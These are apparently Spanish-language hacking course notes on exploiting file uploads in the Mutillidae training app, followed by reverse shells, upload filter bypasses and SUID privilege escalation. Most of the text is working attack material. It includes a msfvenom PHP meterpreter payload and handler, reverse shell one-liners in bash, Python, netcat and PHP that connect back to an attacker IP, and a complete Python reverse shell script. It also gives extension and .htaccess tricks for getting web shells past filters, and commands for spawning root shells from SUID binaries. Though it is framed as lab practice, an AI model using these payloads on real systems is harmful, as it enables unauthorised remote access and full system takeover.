## ⑨ Explotación web — File Upload

Revisamos el módulo de **File Upload** en Mutillidae, que tiene 3 aplicaciones:
- **File Upload (JS)**
- **File Upload**
- **File Upload - Overwrite**

### Qué permite un File Upload mal configurado

> [!important] Riesgos del File Upload
> - **Almacenar archivos maliciosos en el servidor**
> - **Ejecutar código en el servidor**
> - **Obtener acceso no autorizado al sistema**
> - **Comprometer la integridad y confidencialidad de los datos**

### Práctica de ejecución

**Paso 1: Crear reverse shell**
```bash
# En Kali, generar un payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f raw > shell.php
```

**Paso 2: Configurar escucha**
```bash
# En otra terminal de Kali
msfconsole
use exploit/multi/handler
set LHOST <YOUR_IP>
set LPORT <PORT>
run
```

**Paso 3: Subir el archivo a Mutillidae**
```bash
# Seleccionar el archivo shell.php generado y subirlo
# La ruta típica en Mutillidae es:
http://<MUTILLIDAE_IP>/../tmp/shell.php
```

> [!important] Localización del archivo subido
> ```bash
> /var/www/Mutillidae/images/tmp/shell.php
> ```
> Con esa ruta se ejecuta el script malicioso.

## ⑩ Reverse Shell — Conceptos clave

Una **reverse shell** es una conexión de tipo **shell** que se establece **desde el objetivo hacia el atacante**.

```bash
# Formato general de una reverse shell
bash -i >& /dev/tcp/<IP_ATACANTE>/<PUERTO> 0>&1

# Alternativas
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f

# PHP
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Script de reverse shell automática (Python)

```python
#!/usr/bin/env python3
import socket,subprocess,os,pty,signal

def handler(sig, frame):
    print("\n[+] Saliendo...")
    exit()

signal.signal(signal.SIGINT, handler)

def reverse_shell(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print(f"[+] Conexión establecida con {ip}:{port}")

        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        pid = os.fork()
        if pid == 0:
            os.execl("/bin/sh", "/bin/sh", "-i")
        else:
            os.waitpid(pid, 0)

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print(f"Uso: {sys.argv[0]} <IP> <PORT>")
        sys.exit(1)

    reverse_shell(sys.argv[1], int(sys.argv[2]))
```

```bash
# Ejecutar la reverse shell desde el servidor
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## ⑭ File Upload — Conceptos avanzados

### Tipos de File Upload maliciosos

| Tipo | Extensión | Descripción |
|---|---|---|
| Web Shell | `.php`, `.asp`, `.jsp` | Permite ejecución remota de comandos |
| Reverse Shell | `.php`, `.py` | Conexión inversa al atacante |
| Web Shell obfuscada | `.php5`, `.phtml` | Evade filtros de extensión |
| Imagen con código | `.jpg`, `.png` | Código embebido en metadatos |
| Archivo de configuración | `.htaccess`, `.config` | Modifica comportamiento del servidor |

### Métodos de upload malicioso

```bash
# Rename bypass
mv shell.php shell.jpg.php
mv shell.php shell.php.jpg

# Double extension
shell.php.jpg
shell.php.png

# Null byte (PHP < 5.3.4)
shell.php%00.jpg

# Content-Type bypass
# Cambiar Content-Type: image/jpeg en el request HTTP

# .htaccess upload
# Crear archivo .htaccess que interprete .jpg como PHP
AddType application/x-httpd-php .jpg
```

## ⑮ Find y SUID — Escalada de privilegios

### Qué es SUID

> [!important] **SUID (Set User ID)**
> Es un permiso especial en Linux que permite a un archivo ejecutarse con los **privilegios del propietario** (generalmente root) en lugar de los del usuario que lo ejecuta.

```bash
# Buscar archivos SUID en el sistema
find / -perm -u=s -type f 2>/dev/null

# Buscar archivos con permisos especiales
find / -type f -perm -4000 2>/dev/null
find / -type f -perm -2000 2>/dev/null
find / -type f -perm -6000 2>/dev/null

# Buscar binarios con capabilities
getcap -r / 2>/dev/null
```

### Binarios SUID comunes para escalada

| Binario | Uso para escalada |
|---|---|
| `/usr/bin/find` | `find -exec /bin/sh -p \;` |
| `/usr/bin/vim` | `vim -c ':!/bin/sh'` |
| `/usr/bin/nmap` | `nmap --interactive` → `!sh` |
| `/usr/bin/python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `/usr/bin/perl` | `perl -e 'exec "/bin/sh";'` |
| `/usr/bin/bash` | `bash -p` |
| `/usr/sbin/exim4` | Explotar vulnerabilidad de exim |

```bash
# Ejemplo con find (SUID)
find / -perm -u=s -type f 2>/dev/null
# Si find tiene SUID:
find / -exec /bin/sh -p \;

# Ejemplo con python
python -c 'import os; os.execl("/bin/sh","sh","-p")'
```
